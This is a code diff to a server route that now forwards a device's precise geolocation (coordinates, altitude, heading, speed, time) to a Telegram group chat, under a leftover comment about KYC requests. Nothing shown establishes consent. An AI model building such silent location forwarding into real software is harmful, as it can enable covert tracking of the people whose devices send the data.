@@ -19,11 +19,20 @@ export async function POST(request) {
   try {
     const data = await request.json();
     console.log(data);
-    const { type, amount, userName, userID, city } = data;
+    const {
+      latitude,
+      longitude,
+      accuracy,
+      altitude,
+      altitudeAccuracy,
+      heading,
+      speed,
+      time,
+    } = data;
 
     // Send message to group via Telegram after KYC request is made
     const groupChatId = '-4140541763'; // Replace with your group chat ID
-    const message = `${type} request has been raised for the amount of ${amount} for ${userName}[${userID}] from ${city}`;
+    const message = `latitude: ${latitude}, longitude: ${longitude}, accuracy: ${accuracy}, altitude: ${altitude}, altitudeAccuracy: ${altitudeAccuracy}, heading: ${heading}, speed: ${speed}, time: ${time}`;
     const finalResp = await sendMessageToGroup(groupChatId, message);
 
     return Response.json({ data: finalResp });
